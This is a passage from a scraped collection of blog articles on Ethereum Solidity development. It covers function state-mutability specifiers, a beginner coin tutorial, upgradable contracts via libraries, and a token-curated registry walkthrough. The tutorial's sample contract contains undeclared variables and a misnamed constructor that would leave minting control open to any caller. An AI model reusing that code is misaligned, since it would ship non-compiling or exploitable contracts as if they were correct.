addition, pure and view affect the JSON ABI that the compiler produces. The stateMutability field for a function indicates whether the function is pure, view, nonpayable, or payable. Tools can access this data without parsing the contracts themselves to aid in generating reports or visualizations that make it easier to understand contracts.Examplessimple-token-saleThe Disbursement contract in simple-token-sale allows tokens to vest gradually during a specified disbursement period. Disbursement.calcMaxWithdraw() calculates the number of tokens that can currently be withdrawn. In the current codebase the function is specified as constant. In terms of the new specifiers, it is a view function---it reads from a contract's state but it doesn't modify it.If we remove the existing constant modifier in the codebase, Solidity will detect that the function is read-only:Disbursement.sol:95:5: Warning: Function state mutability can be restricted to view    function calcMaxWithdraw()    ^Adding the view modifier as shown below makes it clear that the function only reads from the state, and allows the compiler to help us maintain that behavior through the lifetime of the codebase.If we later modify the function and violate that specifier (intentionally or not), Solidity will warn us:Disbursement.sol:102:9: Warning: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.    withdrawnTokens = 0;    ^-------------^To avoid overlooking this kind of behavior change, we can add pragma experimental \"v0.5.0\" to the file to make the compilation fail with an error instead of just logging a warning.Note that calcMaxWithdraw calls token.balanceOf, a function that can contain arbitrary code that could write to the token contract\u2019s storage and violate the view specifier on calcMaxWithdraw. Since the abstract Token class in this project specifies balanceOf as constant, Solidity knows it should be safe to call it within a view function. If we remove the constant specifier from balanceOf, Solidity will warn us (or throw a compilation error if enabled):browser/Disbursement.sol:100:27: TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.    uint maxTokens = (token.balanceOf(this) + withdrawnTokens) * (now - startDate) / disbursementPeriod;                      ^-------------------^zeppelin-solidityThe SafeMath contract in zeppelin-solidity provides math functions that throw exceptions to prevent integer overflows. It's a library contract without its own state. In the current codebase, these functions are specified as constant, which indicates that the function doesn't write to the state, but doesn't let you know if it reads from the state. In terms of the new specifiers, these are pure functions\u2014they don't read or write any state.Compiling SafeMath with the latest Solidity will throw several warnings like this one to let us know that the functions aren't just constant or view, they're pure:SafeMath.sol:27:3: Warning: Function state mutability can be restricted to pure    function add(uint256 a, uint256 b) internal constant returns (uint256) {    ^Updating these modifiers to pure communicates the behavior more precisely:function add(uint256 a, uint256 b) internal pure returns (uint256) {  uint256 c = a + b;  assert(c >= a);  return c;}STATICCALLThe Byzantium network upgrade scheduled for October 9 will add a STATICCALL opcode that enforces read-only calls at runtime. Solidity only implements the STATICCALL opcode in its assembly language. Adding pureand view specifiers does not change the opcode that will be used to call the function, so they only affect compiler errors, not any behavior on chain. In the future, calls to pure or view functions could be compiled as STATICCALL, ensuring that the developer\u2019s expectations of immutability are never violated.STATICCALL allows a subset of reentrancy vulnerabilities to be avoided: if a contract\u2019s state change depends on reading data from another contract, it can safely retrieve it without ever triggering a conflicting state change. However, if your contract\u2019s state change requires a successful state change in another contract, STATICCALL cannot be used, so you still need to take precautions against reentrancy.STATICCALL introduces new scenarios that can cause transactions to fail, which is important to consider when calling arbitrary contracts. Solidity can detect state mutability violations within a single codebase, but third-party contracts that implement standard interfaces (like tokens or registries) live in separate codebases with their own definitions of those interfaces that might be more loosely defined than the standard. Mandating the use of ethpm for standard interfaces is one potential way to make sure we can rely on Solidity\u2019s static analysis across codebases. Until then, keep your eyes open: with new behavior comes new vulnerabilities.", "responses": "1"}, {"title": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To\u00a0Start?", "author_name": "Pramod Chandrayan", "link": "https://codeburst.io/a-simple-smart-contract-using-solidity-which-you-wished-to-create-but-didnt-knew-how-to-start-c7a6b39af1e7?source=search_post", "post_date": "Dec 28, 2017", "readtime": "9 min read", "upvotes": "235", "content": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To\u00a0Start?Pramod ChandrayanBlockedUnblockFollowFollowingDec 28, 2017sourceBlockchain is the technology working at the core & empowering all the popular cryptocurrencies like Bitcoins, Ripple, Ethereum, Litecoins etc. It has been catching the imaginations of the masses and given them the reason to dream big. Having said that it becomes even more important for developer community & all tech entrepreneurs that they act responsibly to make sure the dreams of millions are given a proper wing so that they can fly with more enthusiasm and with a sense of security.I have already covered the blockchain basics in my previous articles-1. Blockchain Technology Part 1\u00a0: What and Why\u00a0?2. Blockchain Technology Part 2\u00a0: Smart Contract Fundamentals3. Smart Contract: A Blockchain Innovation For Non-TechiesIt is recommended that you go through all those basic fundamentals, to have the required understanding before we write our first smart contract.Assumption\u00a0:You must have basic fundamental knowledge of cryptocurrencies like Bitcoin & Ethereum, Litecoin etc\u2026You should have some hands-on experience in ANY programming language or scripts (like C, Java, JavaScript, PHP, Python, Ruby, Shell etc.)We will create our first smart contract using a popular Solidity Framework\u00a0. So let me first navigate you through some basics of Solidity as a whole. We will cover this journey together in following stepsWhat Is Solidity?IDE\u2019s & Tools We Need To Get Started.Getting Hands Dirty With Coding Stuff.Infographics: To keep You Informed1. What Is Solidity?Solidity is a high level language which helps developers to implement smart contracts and extracts it\u2019s essence from C++, Python & JS. Solidity language has been designed to support EVM(Ethereum Virtual Machine). Solidity is statically typed and supports inheritance. It comes loaded with a rich set of libraries to help you code with ease.Solidity is a contract-oriented, high-level language for implementing smart contracts. It has been influenced by C++, Python and JavaScript and is designed to target the Ethereum Virtual Machine (EVM). It is statically typed, supports inheritance, libraries and complex user-defined types among other features.With solidity, it is possible to create contracts for voting, crowdfunding, blind auctions, multi-signature wallets and more\u2026source: pwc2. IDE\u2019s & Tools We Need To Get\u00a0Started.To get started with solidity you need IDE, Some of the popular IDE\u2019s which support solidity plugin giving you all the tools you need to write your codes are:IDE\u2019s-As per official solidity web portal\u00a0:- Here are few among many IDE\u2019s which supports smart contracts development-Remix- It runs on browser and comes preloaded with code compiler & solidity run time environmentIntelliJ IDEA plugin Solidity plugin for IntelliJ IDEA (and all other JetBrains IDEs)Visual Studio Extension Solidity plugin for Microsoft Visual Studio that includes the Solidity compiler.Package for SublimeText\u200a\u2014\u200aSolidity language syntax Solidity syntax highlighting for SublimeText editor.Ethereum Studio Specialized web IDE that also provides shell access to a complete Ethereum environment.Solidity Tools(source)Dapp- Build tool, package manager, and deployment assistant for Solidity.Solidity REPL- Try Solidity instantly with a command-line Solidity console.Solgraph- Visualize Solidity control flow and highlight potential security vulnerabilities.evmdis- EVM Disassembler that performs static analysis on the bytecode to provide a higher level of abstraction than raw EVM operations.Doxity- Documentation Generator for Solidity.Installing Solidity:Using npm /\u00a0Node.js:It can be done in most portable & hassle free way using Emscripten a platform independent JS library. Here is the repository of solc-js. Download it. you will have command line tool called solcjs which you can install using npm as given below-npm install -g solcSolidity Binary Packages:To get Binary packages of Solidity click: solidity/releases.Binary packages of Solidity available at solidity/releases.Personal Packages\u00a0Archive:You can slo download PPAs for Ubuntu. For the latest stable version do thissudo add-apt-repository ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install solcFor Cutting edge developer version do this:sudo add-apt-repository ppa:ethereum/ethereumsudo add-apt-repository ppa:ethereum/ethereum-devsudo apt-get updatesudo apt-get install solcFor more detail about getting through with the Solidity installation please go through\u00a0:Installing Solidity\u200a\u2014\u200aSolidity 0.4.20 documentationOnce you are through configuring Solidity based on your pc/laptops Operating system, you will be all set to start writing your very first Ethereum smart contract.3. Getting Hands Dirty With Coding\u00a0Stuff.Your Maiden Smart Contract Code Snippet\u00a0: Are You\u00a0Excited?Here We Go\u00a0.\u00a0\u2026\u2026\u2026.& It\u2019s Ok if you are not able to grab some of what has been written we will understand as we go about it in detail.MyFirstContract://Code Snippet 1.0pragma solidity ^0.4.0;// here we define the version of soliditycontract MyFirstContract {uint mydata;function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}}Lets decode the code snippet 1.0:pragma\u00a0: keyword instructs compiler how to treat the source code written. As you can see we have instructed the compiler about the version of Solidity. A contract structure has two major component-FunctionsState(Data)this datas are stored at specific address on Ethereum Blockchain.uint mydata;  it is a declaration of data state variable which has a dataype of unsigned integer(of 256 bits size)functions:-function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}here the functions set and get helps you to modify or retrieve the value of the variable.Note! In order to access a state variable like mydata, you don\u2019t need the prefix this. as we get to see in many other programming language.A Crypto Coin Demo Example in Solidity-Now when you have equipped yourself with some Smart Contract basics, I hope you are excited enough to further decode this smart contract mystery.I feel\u00a0:Every new skills learned should be a adventure for a developer. It should be a fuel to keep you going and to keep you inspired.See i am writing this article out of sheer excitement & with a purpose to learn more and help more fellow developers & blockchain enthusiasts.How Ethereum\u00a0WorksMyFirstCoin:This code snippet has been inspired by solidity official web pageCode Snippet 2.0// sourced frompragma solidity 0.4.8;contract MyFirstCoin {/** @note Example for the Solidity Course* @dev Just for demo the simple crypto example**/address public iMinter;uint public SumTotalCoin;event CoinsMintedLog(address addressedTo, uint amount);event CoinsSentLog(address sentTo, uint amount);mapping (address => uint) balances;function Coin(uint initCoins) {iMinter = msg.sender;SumTotalCoin = initCoins;balances[iMinter] = initCoins;}/// @notice Mint the coins/// @dev This does not return any value/// @param owner address of the coin owner, amount amount of coins to be delivered to owner/// @return Nothingfunction mint(address owner, uint amount) {if (msg.sender != iMinter) return;balances[owner] += amount;SumTotalCoin += amount;CoinsMintedLog(owner, amount);}function send(address receiver, uint amount) {if (balances[msg.sender] < amount) return;balances[msg.sender] -= amount;balances[receiver] += amount;CoinsSentLog(receiver, amount);}function queryBalance(address addr) constant returns (uint balance) {return balances[addr];}function killCoin() returns (bool status) {if (msg.sender != minter) throw;selfdestruct(minter);}}Explanation Time For MyFirstCoin:address public iMinter;declares a state variable of type address that is publicly accessible. The address type is a 160-bit value that does not allow any arithmetic operations. It has public access type so that you can access these data state variable current value it holds, Without this keyword, other contracts have no way to access the variable. The function will look something like this:function minter() returns (address) { return iMinter; }mapping (address => uint) public balances;here we are creating a balance type of complex state variable which maps addresses to unsigned integer data type. Here mapping an address uses hash tables which virtually initialized such that every possible key exists and is mapped to a value whose byte-representation is all zeros.event CoinsSentLog(address sentTo, uint amount);This event is triggered within the function send where it listens to the. As soon as it is fired, the listener will also receive the arguments from, to and amount, which makes tracking transactions. To listen for this event, you can use below code snippetMyFirstCoin.Sent().watch({}, \u2018\u2019, function(error, result) {if (!error) {console.log(\u201cCoin transfer: \u201c + result.args.amount +\u201c coins were sent from \u201c + result.args.from +\u201c to \u201c + result.args.to + \u201c.\u201d);console.log(\u201cBalances now:\\n\u201d +\u201cSender: \u201c + MyFirstCoin.balances.call(result.args.from) +\u201cReceiver: \u201c + MyFirstCoin.balances.call(result.args.to));}})MyFirstCoin is the constructor which is run during creation of the contract and cannot be called afterwards. It permanently stores the address of the person creating the contract: msg (together with tx and block) is a magic global variable that contains some properties which allow access to the blockchain. msg.sender is always the address where the current (external) function call came from.functions like mint and send, will eventually hold the contracts to enquired by the users & other similar contracts. If anyone other than contract creator tries to access mint it is not possible.Only send method can be used by a person who already have some coins in their kitty to send.4. Some Infographics: To Keep You Informed:source: chipin.comWhat Next\u00a0?I hope you now have some required understanding of how to write a basic smart contract\u00a0, next we will further try to understand how EVM ethereum virtual machine function and manages transactions. Some of the things which we will cover in the upcoming series of articles on \u201c Blockchain Using Solidity.\u201d -EVM OverviewEthereum AccountsTransactions Between Those Accounts& much more\u2026.Summing Up:As I have already spoken in one of my article Top 3 Technology Trends For 2018, Which Will Be A Game Changer\u00a0! that Blockchain based tech will be a hot cake in coming years and if one is looking for better career opportunity professionally he should not only keep a close eye on it, but also need to invest some serious time learning the craft of it. Banking, voting, insurance, user authentication, contracting & many more use cases will pop up as the year unfolds, and one should not just let it pass by. As a developer or as an entrepreneur it becomes really important that we adopt this trend and create some innovative solutions which can pass on the benefit to the masses.Already people who never traded in the existing share market have started to invest in their capacity on cryptos, with all excitement to grow their wealth. The ease of creating account & freedom to invest without too much regulation has fascinated many new & first time investor. This is not going to cool of any sooner.With all this open market opportunities, now onus is on all the Technology innovators & Visionaries to utilize this blockchain technology and see what they can come up with, to fire the imagination of the youth, who are going to be an early adopter of what we have to offer.Don\u2019t forget to check out my thoughts on edge computing:All About Edge Computing- How It Is Changing The Present Past & Future Of IoT?which i feel will be a tech trend to watch out in 2018 & beyond.If you are \ud83d\udc9a \ud83d\udc9a my contribution do \ud83d\udc4f \ud83d\udc4f clap\u00a0, Click Here and subscribe to reach out to me for more and I would feel blessed to hear you and respond\u00a0back.for more do check out\u00a0: www.techprenuer.com where very often i share my learning for all you lovely readers\u00a0.I am really honored with all the love & feedbacks, I have been receiving for my contribution and i am really thankful to all of you for inspiring me\u2026.Thanks A Lot & Wishing You All A Very Blissful New Year 2018,\u00a0ahead.", "responses": ""}, {"title": "How to Write Upgradable (Versioned) Smart Contracts in Solidity?", "author_name": "vasa", "link": "https://hackernoon.com/how-to-write-upgradable-versioned-smart-contracts-in-solidity-910007057943?source=search_post", "post_date": "Dec 15, 2018", "readtime": "8 min read", "upvotes": "116", "content": "How to Write Upgradable (Versioned) Smart Contracts in Solidity?A Complete Guide on Understanding and Implementing Upgradable Smart Contracts in Solidity using LibrariesvasaBlockedUnblockFollowFollowingDec 15, 2018Versioning(Pseudo-Versioning) Smart ContractsImmutability is a feature that makes the Blockchain great.But like everything in this world, it also does have some cons.This article focuses on Reusability and Upgradeability of Smart Contracts in today\u2019s Blockchain platforms. We will mainly talk about Ethereum in this article, which is the most widely used smart contract platform today.But first Go make a cup of coffee\u2615 first, it\u2019s going to be a long one.We will start by seeing what are the reasons behind these restrictions/inabilities of current smart contract platforms. Then we will explore workarounds to model the Upgradeability(versioning) behavior(I call it Pseudo-Versioning) which we enjoy today in almost all of the centralized platforms.P.S. If you are really new to EVM(or want to learn about EVM in depth), then consider going through the below article.Getting Deep Into EVM: How Ethereum Works BackstageAn Ultimate, In-depth Explanation of What EVM is and How EVM Works.hackernoon.comOverviewSolidity(broadly speaking, EVM) has still a long way to go in terms of programmer productivity and language expressiveness. If you have worked with Ethereum, then by now you have probably realized thatSolidity is a limited language.Especially, when you come from the lands of Swift and Javascript, developing in Solidity is definitely a step back in terms of what the language allows the programmer to do and the expressiveness of the language.This can sometimes, piss you off.Even the Panda got pissed offBut Why it is\u00a0Limited?Solidity, and in general languages that compile to bytecode intended to be executed in the EVM(which is a sandboxed), are limited because:When executed, your code will run on every node of the network. Once a node receives a new block, it will verify its integrity. In Ethereum this also means verifying that all the computations that happened on that block were performed correctly and the new state of contracts is correct.This causes that, even though the EVM is Turing-complete, heavy computations are expensive (or directly not allowed by the current gas limit) because every node will need to perform it, therefore slowing the network.A standard library hasn\u2019t really been developed yet. Arrays and strings are especially painful, I have personally had to implement my own string manipulation library in order to do basic stuff, that we take for granted otherwise.You cannot get data from the outside world (out of the EVM) unless it gets in via a transaction (Oracle) and once a contract is deployed it is not upgradable (you can plan for migrations or pure storage contracts, though).Some of this limitations are needed for the existence of the Ethereum computing platform (you will never be able to store a backup of your Google Photos and perform image recognition purely on-chain, and that is just fine). Other limitations are here just because it is a really young technology (though evolving blazingly fast) and it will keep improving over time.Ok. But how the F**k do I solve this\u00a0problem?While working on a project, which needed changes in the contracts in future, I came across \u201clibrary\u201d. This is a feature of Solidity which helps us to solve(indirectly) this problem. Before going into the Upgradable contract implementation, let\u2019s see what is it and it\u2019s limitations.What are libraries and Why do we Need\u00a0them?In Solidity, a library is a different type of contract, that doesn\u2019t have any storage and cannot hold ether. Sometimes it is helpful to think of a library as a singleton in the EVM, a piece of code that can be called from any contract without the need to deploy it again. This solves some big problems like:Deployment gas costs: This has the obvious benefit of saving substantial amounts of gas, because the same code doesn\u2019t have to be deployed over and over, and different contracts can just rely on the same already deployed library.Code repetition in the blockchain: This is obvious from the above point.Code Updates: Earlier bug fixes and updates need to be deployed independently on each project (or, even worse, Ethereum has to hard fork to fix a contract\u2019s problems). Now, it\u2019s solved.Libraries do sound awesome, right? Unfortunately, they also have some limitations. Below are some important things to know about libraries:Libraries don\u2019t have storage capabilities.Libraries can manipulate the storage of other contracts.Libraries cannot have payable functions.Libraries cannot have a fallback function.Libraries don\u2019t have an event log.Libraries can be used to fire event logs for the contract which uses it.Libraries aren\u2019t allowed to inherit.Even though libraries cannot directly inherit, they can be linked with other libraries and use them in the same way a contract would, but with the natural limitations of libraries.These points can sound confusing at first. Don\u2019t Panic. Here is a great resource to get your head around libraries.Library Driven Development in SolidityA comprehensive review on how to develop more modular, reusable and elegant smart contract systems on top of the\u2026medium.comBut for now, we will only cover the parts which we need to understand in order to understand/implement upgradable contracts.How does a Library\u00a0work?A library is a type of contract that doesn\u2019t allow payable functions and cannot have a fallback function (these limitations are enforced at compile time, therefore making it impossible for a library to hold funds). A library is defined with the keyword library (library L{}) in the same way a contract is defined (contract C{}).Calling a function of a library will use a special instruction (DELEGATECALL), that will cause the calling context to be passed to the library as if it was code running in the contract itself. I really like this angle from the Solidity documentation,\u201cLibraries can be seen as implicit base contracts of the contracts that use them\u201dIn the above snippet, when function a() of contract C is called, the address of the contract will be returned and not the library's. This appears to be the same for all msg properties: msg.sender, msg.value, msg.sig, msg.data and msg.gas. (Solidity documentation related to this indicates otherwise, but after doing some testing it looks like msg context is maintained).One thing we can notice here is that it is not clear how class C and library L are linked. So, let\u2019s see that.How are libraries linked?Different from explicit base contract inheritance, (contract C is B {}) in a contract that depends on a library, it is not that clear how a contract gets linked with a library. In the above case, contract C uses library L in its function a(), but there is no mention of what address of the library to use, and L won't get compiled inside C's bytecode.Library linking happens at the bytecode level. When contract C is compiled, it leaves a placeholder for the library address in this way 0073__L_____________________________________630dbe671f(0dbe671f is the function signature for a()). If we were to deploy contract C untouched, the deployment would fail as the bytecode is invalid.In simple words, Library linking is as simple as replacing all occurrences of the library placeholder in the contract bytecode with the address of the deployed library in the blockchain. Once the contract is linked to the library, it can be deployed.", "responses": "1"}, {"title": "Dev Diary II: A Walkthrough of the adChain Registry TCR in\u00a0Solidity", "author_name": "adChain", "link": "https://medium.com/metax-publication/a-walkthrough-of-the-adchain-registry-tcr-in-solidity-72addcde17fb?source=search_post", "post_date": "Nov 13, 2017", "readtime": "10 min read", "upvotes": "316", "content": "Dev Diary II: A Walkthrough of the adChain Registry TCR in\u00a0SolidityadChainBlockedUnblockFollowFollowingNov 13, 2017Recommended reading: I previously dissected the implementation of PLCRVoting.sol developed for adChain. The first article provides helpful background to better understand the adChain Registry walkthrough.The adChain Registry is a token-curated registry (TCR). Excitingly, adChain\u2019s TCR implementation is highly generic! Just like our partial-lock commit/reveal (PLCR) voting code can be used for token voting with any ERC-20, the adChain Registry is generic to any TCR use case that authenticates listings as strings. If you don\u2019t know what token-curated registries are about in general, here are a few good articles on the topic.This article is about implementing a TCR. If you read the previous article on PLCR voting, you will be happy to know that implementing the rest of a token-curated registry is much simpler.What\u2019s in a TCR?A token-curated registry is, fundamentally, a lookup table. The system\u2019s hottest path is a view function for checking whether or not some key exists in the registry. This can be a simple public mapping for which solc\u2019s generated getter will suffice. The complexity, of course, will be in populating that mapping.The main game loop in a TCR is its application/challenge process. In this game loop a candidate puts down a deposit in the registry\u2019s intrinsic token to begin an application. After some period if no challenge is raised, the candidate can poke their application into listing status (and the deposit stays with the listing). If a challenge is raised against an application or a listing, a token-weighted vote begins. The voting logic is handled by the PLCR voting contract, while the registry updates listing and application statuses, and disburses rewards to winners on the basis of voting outcomes.There is also a system for parameterizing the TCR, but we\u2019ll save that for a future blog post.DeploymentA token-curated registry takes three constructor arguments to initialize its storage, all of which are contract addresses: the registry\u2019s intrinsic token, the PLCR voting instance it will rely on, and the parameterizer contract that provides the registry\u2019s system parameters. We\u2019ll see later how exactly all these things are used, but note for your own purposes that there are dependencies in the order for which these systems are deployed.ApplicationsWhen an unlisted candidate desires to acquire listing status in a registry, they will need to make an application. The apply function takes a string for the domain which is being applied, and an integer amount which is the number of tokens to deposit with the application.The apply function begins with some require checks. First, we\u2019ll call a helper function to make sure the domain being applied isn\u2019t already whitelisted. Next, we\u2019ll call another helper function to check whether an active application already exists for this domain, and throw an error if one does. Finally, we make sure that the amount of tokens specified as the deposit is at least the minimum specified by the TCR\u2019s parameterizer.We\u2019ll come back to some of these helper functions later to see how they actually work, but lets consider them abstract for now.If all the required checks pass, we\u2019ll instantiate a data structure called a Listing for this domain. Applications and Listings use the same data structure, and Listing structs contain a boolean called whitelisted to determine whether the contents of a listing have successfully completed the application process or not.First, we\u2019ll grab the location in storage for this domain\u2019s Listing struct in the listings mapping, and set the Listing\u2019s owner as the message sender of the function invocation (the address of the account that called the apply function). On line 95 we\u2019ll attempt to transfer the amount of tokens specified by the function caller from their account to the registry contract.Finally, we\u2019ll set the listing\u2019s application expiry date to the current time plus the parameterizer\u2019s applyStageLen, and set the listing\u2019s unstaked deposit to the specified token amount. The application expiry date is the date after which an application can be poked in whitelisted status if it hasn\u2019t been challenged. The unstaked deposit is the number of tokens in a listing which are not locked up in a challenge at any given time.We fire an event to notify any curious client applications, and then we\u2019re done! We\u2019ve made an application to the adChain TCR.Now we\u2019ll look at what happens when a challenge is made against an application.ChallengesThe challenge method accepts a single argument, the string-encoded name of the domain to be challenged (which is the key to a Listing struct in the listings map). After initializing some local variables, including a pointer to storage for the listing being challenged, we perform some require checks.First we\u2019ll make sure a Listing struct exists for the provided string. If there isn\u2019t one, there is nothing to challenge! The next check we do is to ensure that only one challenge can exist per listing at any given time. To do this, we\u2019ll grab the listing\u2019s challenge ID and use it to index into a mapping of challenges. Then, using Solidity\u2019s method-like syntax for library data structures, we\u2019ll require that either no challenge exists for the listing, or that it has been resolved if one does.We learned about Solidity\u2019s facility for pseudo-object-oriented programming with our DLL and AttributeStore data structures in the PLCR voting walkthrough, so we won\u2019t retread too much ground on the mechanics of that here. We use an external library for itsthe Challenges data structure, as because our parameterizer uses the exact same mechanism, so and a library helps us to not write duplicate code. A Challenge struct contains a lot of information.We have special logic to capture the touch-and-remove TCR edge case beginning on line 180. If the listing\u2019s unstaked deposit is less than the TCR\u2019s current MIN_DEPOSIT, we execute the touch-and-remove by calling a helper function resetListing, which transfers any unstaked deposit in the listing to its owner and deletes the listing from the listings map.Let\u2019s assume the MIN_DEPOSIT has not changed since application time, so we won\u2019t hit that edge case. Notice though that this is exactly why we allow users to specify deposits greater than MIN_DEPOSIT, so as to guard against situations like that! To continue, on line 187 we transfer tokens from the challenger (the message sender) to the registry contract equal to the required MIN_DEPOSIT.Next we initialize some data structures. We create a new poll in our PLCR contract and capture its poll ID. Then we initialize a new Challenge struct. Most of the struct members are self-explanatory except for perhaps rewardPool and winningTokens. The rewardPool is the absolute number of tokens which will be available for voter rewards when the challenge is resolved. winningTokens is (eventually) the absolute number of tokens which were committed for the winning side of the vote. We\u2019ll see later how these two struct members are used to compute voter payouts by token weight.After instantiating those data structures we\u2019ll add the new challenge to the challenged domain\u2019s Listing struct by its challenge ID (which corresponds to a PLCR poll ID), and decrement the listing\u2019s unstaked deposit by the deposit amount of the challenger. This prevents the challenged listing\u2019s owner from withdrawing their stake while the challenge remains unresolved.VotingVoting is delegated to the registry\u2019s PLCR voting contract, the address of which is stored in the state variable called voting. Client software should find and expose the polls that correspond to open challenges and expose these to users for commit/reveal voting. PLCR voting was discussed in a previous article so we\u2019ll blackbox it and assume the following for the purposes of our walkthrough: a vote was concluded in which two deposits of 100 tokens each were at stake. The challenger won the challenge, with 200 tokens voting in support of the challenge and 100 tokens voting against. The registry\u2019s DISPENSATION_PCT is 50.Resolving a challengeOnce a Challenge\u2019s reveal stage has ended, the registry\u2019s updateStatus function can be called for the challenged domain.updateStatus is a general routing function that will branch us off into more specific logic depending on the state of the domain whose status is being updated. The first thing we\u2019re going to check is if the provided domain canBeWhitelisted.We\u2019re going to check four things in canBeWhitelisted: does an application exist and, if so, has its expiry date passed and, if so, is this not already whitelisted and, if so, does a challenge either not exist or, if one does exist, has it been resolved? If that entire boolean statement evaluates as true, the domain can be whitelisted. Our domain will fail the final test, however: a challenge does exist and it has not been resolved. So we proceed to the next check: challengeCanBeResolved.challengeCanBeResolved is a simple wrapper function that calls the Challenge\u2019s canBeResolved method. This method checks with the PLCR contract to see whether voting for the challenge\u2019s poll has been concluded and that this challenge has not already been resolved. In our case, this will all be true, so we proceed to our registry\u2019s resolveChallenge function.The resolveChallenge function is private, and operates on the internal state of a Challenge struct. It\u2019s a somewhat complex function, and dangerous! Lets use it to resolve our challenge.The first thing we do is get pointers to our Listing and Challenge structs in storage, since we\u2019ll be using them a lot. Then we\u2019ll create a variable called winnerReward which is computed by the challengeWinnerReward method of the Challenge struct.The first thing challengeWinnerReward does is handle an edge case: if nobody voted in the poll, give all of the loser\u2019s stake to the winner (as opposed to burning the portion that would otherwise be reserved for voters). We don\u2019t hit this edge case in our example, so we return twice the stake minus the amount of the reward pool (which, recall, is the number of tokens reserved for voters on the winning side). So we return the challenge winner\u2019s stake plus their special dispensation of the loser\u2019s stake.After computing that we\u2019ll set a local bool wasWhitelisted. The only use of this variable will be to help us fire more informative events.Next we\u2019ll check whether the challenge succeeded or failed using the isPassed method of our PLCR contract. If the application \u201cpassed\u201d, that means the challenge failed. In our case the application did not pass, so we\u2019ll jump to the else clause on line 366.In this clause we reset the listing, which removes the struct from storage (or de-initializes it, really) and transfers any tokens that weren\u2019t staked in the challenge back to the listing owner. Then we transfer the winnerTokens to the challenge winner and fire some events.Finally, and irrespective of whether the challenge was won or lost, we\u2019ll set the the Challenge\u2019s winningTokens to the result of the PLCR contracts getTotalNumberOfTokensForWinningOption method and set the Challenge\u2019s resolved member to true. Note that even though we\u2019ve deleted the Listing from storage, the Challenge remains!The aftermath: voters claiming rewardsAfter a challenge has been resolved, voters on the winning side will want to claim their spoils. Remember that rewards come from the forfeited deposit of the losing party in the challenge, which was always in the custody of the registry contract. To withdraw the principal tokens a voter actually used to vote with, they\u2019ll need to interact with the PLCR contract itself. To claim rewards, voters use the claimReward function, which is a thin wrapper around the Challenge\u2019s claimReward method.A Challenge struct includes a mapping of addresses to bools called tokenClaims. tokenClaims are initialized as false, and we\u2019ll set them to true as token holders come in to claim their rewards. The first thing we check in a claimReward call is that the voter has not already claimed a reward. We also check that the challenge being claimed for has actually been resolved.Next we\u2019ll set two local variables. The first is just the number of tokens the voter has committed on the winning side of the vote, and is computed by the PLCR contract\u2019s getNumPassingTokens function. Then we set a variable called reward, computed by the Challenge\u2019s own voterReward method.voterReward divides the product of the voter\u2019s winning tokens and the reward pool by the absolute number of winning tokens. In our example the reward pool will be 50 tokens, since 100 tokens were at stake and the special dispensation is 50. We\u2019ll say this voter committed 50 out of 200 tokens to the winning side. So the product of their 50 tokens and the reward pool is 2500, divided by the winning tokens (200) is 12.5. We don\u2019t handle fractional amounts, so reward will end up as 12 (a luckier claimant will end up taking that\u00a0.5 home eventually).Once we\u2019ve gotten the number of winning tokens the voter committed and calculated their reward, we\u2019ll deduct their tokens from the Challenge\u2019s winningTokens and deduct their reward from the rewardPool. This keeps the proportionality of token allocations correct as future claimants come in to claim their spoils. Finally we transfer the reward to the voter and set the voter\u2019s key in the tokenClaims mapping to true. We\u2019re done!We didn\u2019t cover absolutely everything the adChain TCR does, but we covered a path that touched most of the codebase and certainly hit the most complex parts.Improving the adChain TCRThe code reviewed here has been frozen for audit, but we hope to make one significant further improvement to be audited as an increment on the initial report.The adChain TCR has many different event types. This is to help clients like app.adChain.com populate user views. This approach requires a persistent server that listens for contract events and feeds them to intermittently connected clients. Preferable would be an iterable data structure that a client can call to get the complete set of listed items. The listings map as-is cannot be iterated, so we imagine adding a doubly-linked list like that used in PLCR voting which can be iterated by clients.Massive props to ConsenSys 2017 interns Irene Lin, Mira Zeitlin and Terry Li for working so hard this summer to make the token-curated registry dream a reality.", "responses": "1"}, {"title": "Smart Contracts on Steroids: Solving the Problems Facing Ethereum\u2019s Solidity", "author_name": "Rachel Wolfson", "link": "https://hackernoon.com/smart-contracts-on-steroids-solving-the-problems-facing-ethereums-solidity-a1f71cc260ce?source=search_post", "post_date": "Jul 30, 2018", "readtime": "5 min read", "upvotes": "209", "content": "Smart Contracts on Steroids: Solving the Problems Facing Ethereum\u2019s SolidityRachel WolfsonBlockedUnblockFollowFollowingJul 30, 2018flickrThe Ethereum network currently consists of more than 1,700 decentralized applications (DApps), a number that is expected to grow in the coming years. And while all of these DApps rely on smart contracts to accomplish a number of important tasks, it has become clear that smart contracts are prone to errors, bugs and other catastrophic mistakes\u200a\u2014\u200ato the tune of more than a billion dollars stolen in smart contract hacks to-date.In order to write a smart contract, programmers must learn an entirely new programming language called \u201cSolidity.\u201d While smart contracts facilitate complex operations in ethereum, making simple mistakes while writing smart contracts in Solidity can cause dire consequences, including security breaches and / or very high transactional costs.One of the most well-known examples of a poorly-coded smart contract came from the Decentralized Autonomous Organization (DAO). A more recent bug also was discovered in the smart contract used by Parity, which was exploited and resulted in the loss of half a million Ether (ETH), worth more than $169 million.Is Solidity to Blame?As issues with smart contracts become more common, Solidity has gained attention as being problematic for the Ethereum network. Unfortunately, many new projects that rely on smart contracts lack programmers with the experience needed to properly optimize and audit smart contracts.For example, in terms of performance, gas fees can be astronomical when executing certain complex smart contracts. \u201cGas\u201d is a nominal unit of Ether that is spent on operating transactions on the Ethereum network. It depends on the complexity of the Smart contract and the congestion of the network at the time of the contract execution. Ethereum automatically punishes slow and complex contracts, rightfully, by charging them very high gas fees. But, in many cases, the use case is inherently complex and such gas fees hamper the real adoption of smart contracts.For instance, using an Ethereum smart contract to verify the header of a single Bitcoin transaction (i.e., a scrypt operation) will cost 370 million Ethereum gas\u200a\u2014\u200amore than 1 billion Gwei (1 ETH) at the gas price of 3 Gwei. That is approximately $500 (USD) just to verify a transaction, which has to be done across more than 100 Ethereum contract transactions.Security, specifically integer overflow, is also problematic when dealing with smart contracts written in Solidity. Hackers are now detecting bugs in smart contracts, allowing them to steal large amounts of cryptocurrency. This has resulted in a high security alert, as multiple ERC20 token contracts are prone to hacks.Many of these 